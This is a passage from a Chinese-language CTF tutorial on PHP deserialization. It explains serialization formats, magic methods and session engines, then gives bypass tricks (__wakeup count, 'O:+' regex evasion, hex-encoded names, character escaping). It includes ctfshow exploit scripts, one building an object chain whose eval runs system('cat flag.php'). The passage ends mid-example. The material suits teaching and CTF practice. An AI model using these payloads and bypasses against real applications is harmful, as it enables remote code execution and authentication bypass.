    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$stu_ser</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>结果：</p>
<pre><code class="hljs plaintext">O:7:"Student":2:{s:4:"name";s:4:"abab";s:3:"age";i:18;}</code></pre>
<p><strong>注：序列化后的内容只有成员变量，没有成员函数</strong></p>
<p>还有一种成员变量就是protected类型</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$aa</span>;
        <span class="hljs-keyword">private</span> <span class="hljs-variable">$bb</span>;
        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cc</span>;
        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;aa = <span class="hljs-string">'aaa'</span>;
            <span class="hljs-variable language_">$this</span>-&gt;bb = <span class="hljs-string">'bbb'</span>;
            <span class="hljs-variable language_">$this</span>-&gt;cc = <span class="hljs-string">'ccc'</span>;
        }
    }
    <span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();
    <span class="hljs-variable">$d_ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$d_ser</span>;

<span class="hljs-meta">?&gt;</span></code></pre>
<p>如果是private类型，会在变量名前加上**\x00类名\x00**，如果是protected类型，则会加上**\x00*\x00**，<br>
这些都是不可见字符</p>
<p>输出则会导致不可见字符<code>\x00</code>的丢失</p>
<p>结果：</p>
<pre><code class="hljs plaintext">O:4:"test":3:{s:2:"aa";s:3:"aaa";s:8:"testbb";s:3:"bbb";s:5:"*cc";s:3:"ccc";}</code></pre>
<p><strong>如果需要本地存储推荐“urlencode”</strong></p>
<pre><code class="hljs plaintext">urlencode($d_ser);</code></pre>
<p><strong>序列化函数serialize()</strong></p>
<p>首先我创一个Ctf类 里面写了三个属性 后创建了一个ctfer对象 将Ctf类里的信息进行了改变。<strong>如果后面还要用到这个对象，就可以先将这个对象进行实例化。用的时候在反序列化出来就ok了。</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230623204959799.png" alt="image-20230623204959799"></p>
<p>serialize() 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，<strong><code>__sleep()</code>方法会先被调用，然后才执行序列化操作</strong>。</p>
<p><strong>可以在<code>__sleep()</code>方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性</strong></p>
<p>实例：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230623205119665.png" alt="image-20230623205119665"></p>
<p><code>即__sleep()</code>方法使 flag age 属性序列化，而name并没有被序列化。所以<strong>可以在<code>__sleep()</code>方法里决定哪些属性被序列化。</strong></p>
<h2 id="0x05-访问控制修饰符">0x05 访问控制修饰符</h2>
<p>根据<strong>访问控制修饰符的不同</strong> 序列化后的 <strong>属性长度</strong>和<strong>属性值</strong>会有所不同，所以这里简单提一下</p>
<pre><code class="hljs plaintext">public(公有) 
protected(受保护)     // %00*%00属性名
private(私有的)       // %00类名%00属性名</code></pre>
<p>protected属性被序列化的时候<strong>属性值</strong>会变成**%00*%00属性名**<br>
private属性被序列化的时候<strong>属性值</strong>会变成**%00类名%00属性名**</p>
<p><strong>（%00为空白符，空字符也有长度，一个空字符长度为 1）</strong></p>
<p>实例：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ctf</span></span>{ 
	<span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">'Sch0lar'</span>; 
	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$age</span>=<span class="hljs-string">'19'</span>; 
	<span class="hljs-keyword">private</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">'get flag'</span>;
    } 
<span class="hljs-variable">$ctfer</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Ctf</span>(); <span class="hljs-comment">//实例化一个对象</span>
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctfer</span>); 
<span class="hljs-meta">?&gt;</span> 
<span class="hljs-comment">//输出结果 </span>
O:<span class="hljs-number">3</span>:<span class="hljs-string">"Ctf"</span>:<span class="hljs-number">3</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">"Sch0lar"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"*age"</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">"19"</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">"Ctfflag"</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"get flag"</span>;}</code></pre>
<p>可以看到</p>
<pre><code class="hljs plaintext">s:6:"*age"   //*前后出现两个空白符，一个空白符长度为1，所以序列化后，该属性长度为6
s:9:"Ctfflag"   //类名Ctf前后出现两个%00空白符，所以长度为9</code></pre>
<h2 id="0x06-php-反序列化">0x06 PHP-反序列化</h2>
<h3 id="61-常见的php魔术方法">6.1 常见的PHP魔术方法</h3>
<pre><code class="hljs plaintext">__construct()，类的构造函数，当一个对象创建时被调用，反序列化不触发

__destruct()，类的析构函数，但如果程序报错或者抛出异常，就不会触发该魔术方法

__call()，在对象中调用一个不可访问方法时调用

__callStatic()，在静态上下文中调用一个不可访问的方法时调用

__get()，读取不可访问属性的值时调用

__set()，在给不可访问属性赋值时调用

__isset()，当对不可访问属性调用isset()和empty()时，__isset()被调用

__unset()，当对不可访问属性调用unset()时，__unset()会被调用

__sleep()，执行serialize()时，先会调用这个函数

__wakeup()，执行unserialize()时，先会调用这个函数

__toString()，类被当成字符串时的回应方法

__invoke()，当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用

__set_state()，当调用var_export()导出类时，此静态方法会被调用

__clone()，当对象复制完成时调用

__debuginfo()，当转储对象以获取应显示的属性时，会被调用

__autoload()，尝试加载未定义的类

__serialize()，执行serialize()时，先会调用这个函数(这个和__sleep()的区别后面会详细介绍)

__unserialize()，执行unserialize()时，先会调用这个函数(这个和__wakeup()的区别后面会详细介绍)</code></pre>
<p><strong>反序列化函数unserialize()。反序列化就是将一个序列化了的对象或数组字符串，还原回去</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230623205817354.png" alt="image-20230623205817354"></p>
<p><strong>与序列化函数类似，unserialize()会检查类中是否存在一个<code>__wakeup</code>魔术方法</strong><br>
<strong>如果存在则会先调用<code>__wakeup()</code>方法，再进行序列化</strong></p>
<p><strong>可以在<code>__wakeup()</code>方法中对属性进行初始化、赋值或者改变。</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230623205935983.png" alt="image-20230623205935983"></p>
<p>反序列化之前重新给flag<strong>属性赋值</strong></p>
<pre><code class="hljs plaintext">// 输出结果 
object(Ctf)#2 (3) {
	["flag"]=&gt;
    string(13) "no flag"
    ["name"]=&gt;
    string(7) "Sch0lar"
    ["age"]=&gt;
    string(2) "18"
}</code></pre>
<h3 id="62-漏洞成因">6.2 漏洞成因</h3>
<p>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。</p>
<p>在反序列化的过程中自动触发了某些魔术方法。</p>
<p><strong>漏洞触发条件：</strong> unserialize函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法</p>
<p>而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。</p>
<h3 id="63-序列化引擎">6.3 序列化引擎</h3>
<p>php对session的处理有三种引擎分别为php、php_serialize、php_binary.经过这三者处理后的session结构都不相同。</p>
<pre><code class="hljs plaintext">php_serialize	-&gt;与serialize函数序列化后的结果一致
php				-&gt;key|serialize后的结果
php_binary		-&gt;键名的长度对应的ascii字符+键名+serialize()函数序列化的值

默认使用php引擎</code></pre>
<p>使用php引擎的结果：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230623210757827.png" alt="image-20230623210757827"></p>
<p>使用php_serialize引擎的结果：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230623210822480.png" alt="image-20230623210822480"></p>
<p>使用php_binary引擎的结果如下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230623210839958.png" alt="image-20230623210839958"></p>
<p>其中存在不可见字符，将结果进行URL编码如下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230623210956081.png" alt="image-20230623210956081"></p>
<p>在session文件可写的情况下，可手动写入我们想要的内容,例如</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/var/www/html'</span>);
<span class="hljs-title function_ invoke__">session_save_path</span>(<span class="hljs-string">'/var/www/html'</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;

<span class="hljs-variable">$banner</span> = <span class="hljs-string">"--4ut15m--\n"</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'name'</span>]===<span class="hljs-string">'admin'</span>){
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>.<span class="hljs-string">"&lt;br&gt;"</span>;
}<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'content'</span>])){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/ph/i'</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>])){
                <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>]);
            <span class="hljs-keyword">die</span>(<span class="hljs-string">'over'</span>);
        }<span class="hljs-keyword">else</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">'/var/www/html/'</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>],<span class="hljs-variable">$banner</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'content'</span>]);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>该题目中可任意文件写入，故写入session文件构造name=admin.<code>payload=|s:3:"xxx";name|s:5:"admin";</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230623211359257.png" alt="image-20230623211359257"></p>
<p>简单说一下payload.</p>
<p>banner和payload拼接在一起后变为<code>--4ut15m--\n|s:3:"xxx";name|s:5:"admin";</code>经php序列化引擎反序列化后就成为了</p>
<pre><code class="hljs plaintext">$_SESSION=['--4ut15m--\n' =&gt; 'xxx', 'name' =&gt; 'admin']</code></pre>
<h2 id="0x07-反序列化绕过小trick">0x07 反序列化绕过小Trick</h2>
<h3 id="71-php71反序列化对类属性不敏感">7.1 php7.1+反序列化对类属性不敏感</h3>
<p>我们前面说了如果变量前是protected，序列化结果会在变量名前加上<code>\x00*\x00</code></p>
<p>但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有<code>\x00*\x00</code>也依然会输出<code>abc</code></p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">'abc'</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;
    }
}
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">'O:4:"test":1:{s:1:"a";s:3:"abc";}'</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<h3 id="72-绕过__wakeup">7.2 绕过__wakeup</h3>
<pre><code class="hljs plaintext">版本：
​ PHP5 &lt; 5.6.25
​ PHP7 &lt; 7.0.10</code></pre>
<p>利用方式：<strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p>
<p>例：</p>
<pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">'abc'</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">'666'</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a;
    }
}</code></pre>
<pre><code class="hljs plaintext">如果执行unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');输出结果为666

而把对象属性个数的值增大执行unserialize('O:4:"test":2:{s:1:"a";s:3:"abc";}');输出结果为abc</code></pre>
<h3 id="73-绕过部分正则">7.3 绕过部分正则</h3>
<p>正则表达式：描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹<br>
配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
<pre><code class="hljs plaintext">preg_match('/^O:\d+/')
//匹配序列化字符串是否是对象字符串开头，+号可以实现绕过（+号代表空格）
//另外反序列化在遇到+号时也会自动退出反序列化进程</code></pre>
<p>利用加号绕过（在url传参时注意+编码为%2B）</p>
<p><strong>serialize(array( a ) )</strong> a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">'abc'</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a.PHP_EOL;
    }
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">match</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>{
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^O:\d+/'</span>,<span class="hljs-variable">$data</span>)){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'you lose!'</span>);
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;
    }
}
<span class="hljs-variable">$a</span> = <span class="hljs-string">'O:4:"test":1:{s:1:"a";s:3:"abc";}'</span>;
<span class="hljs-comment">// +号绕过</span>
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'O:4'</span>,<span class="hljs-string">'O:+4'</span>, <span class="hljs-variable">$a</span>);
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-keyword">match</span>(<span class="hljs-variable">$b</span>));
<span class="hljs-comment">// serialize(array($a));</span>
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">'a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}'</span>);</code></pre>
<p>对应 <strong>ctfshow web258</strong></p>
<p>编写脚本：</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">'xxxxxx'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">'xxxxxx'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">'backDoor'</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>=<span class="hljs-title">new</span> <span class="hljs-title">backDoor</span>();</span>
<span class="hljs-class">    }</span>
<span class="hljs-class"></span>
<span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__destruct</span>()</span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>-&gt;<span class="hljs-title">getInfo</span>();</span>
<span class="hljs-class">    }</span>
<span class="hljs-class"></span>
<span class="hljs-class">}</span>
<span class="hljs-class"></span>
<span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">backDoor</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">'system("cat flag.php");'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);
    }
}
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'O:'</span>, <span class="hljs-string">'O:+'</span>,<span class="hljs-variable">$a</span>);<span class="hljs-comment">//绕过preg_match</span>
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-meta">?&gt;</span>
    <span class="hljs-comment">//主要是调用backDoor执行eval命令函数获取flag</span></code></pre>
<h3 id="74-利用引用">7.4 利用引用</h3>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">'abc'</span>;
        <span class="hljs-variable language_">$this</span>-&gt;b= &amp;<span class="hljs-variable language_">$this</span>-&gt;a;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{

        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a===<span class="hljs-variable language_">$this</span>-&gt;b){
            <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;
        }
    }
}
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>());</code></pre>
<p>上面这个例子将<code>$b</code>设置为<code>$a</code>的引用，可以使<code>$a</code>永远与<code>$b</code>相等</p>
<p>对应于<strong>ctfshow 265</strong></p>
<p>脚本代码：</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowAdmin</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>,<span class="hljs-variable">$p</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$t</span>;
        <span class="hljs-variable language_">$this</span>-&gt;password = &amp;<span class="hljs-variable language_">$this</span>-&gt;token;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;token===<span class="hljs-variable language_">$this</span>-&gt;password;
    }
}

<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshowAdmin</span>(<span class="hljs-string">'123'</span>,<span class="hljs-string">'123'</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<h3 id="75-16进制绕过字符的过滤">7.5 16进制绕过字符的过滤</h3>
<pre><code class="hljs plaintext">O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
可以写成
O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
表示字符类型的s大写时，会被当成16进制解析。
61(16进制)-&gt;97(十进制)-&gt;a(ASCII)</code></pre>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">'admin'</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;
    }
}
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">'username'</span>)!==False){
        <span class="hljs-keyword">echo</span>(<span class="hljs-string">"你绕不过！！"</span>.PHP_EOL);
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;
    }
}
<span class="hljs-comment">// 未作处理前</span>
<span class="hljs-variable">$a</span> = <span class="hljs-string">'O:4:"test":1:{s:8:"username";s:5:"admin";}'</span>;
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-comment">// 做处理后 \75是u的16进制</span>
<span class="hljs-variable">$a</span> = <span class="hljs-string">'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}'</span>;
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);</code></pre>
<h3 id="76-php反序列化字符逃逸">7.6 PHP反序列化字符逃逸</h3>
<p><strong>1.过滤后字符变多（反序列化后的一个x替换成为两个）</strong></p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"x"</span>,<span class="hljs-string">"xx"</span>,<span class="hljs-variable">$str</span>);
}
<span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>];
<span class="hljs-variable">$age</span> = <span class="hljs-string">"I am 11"</span>;
<span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$name</span>,<span class="hljs-variable">$age</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"反序列化字符串："</span>;
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"过滤后:"</span>;
<span class="hljs-variable">$old</span> = <span class="hljs-title function_ invoke__">change</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));
<span class="hljs-variable">$new</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$old</span>);
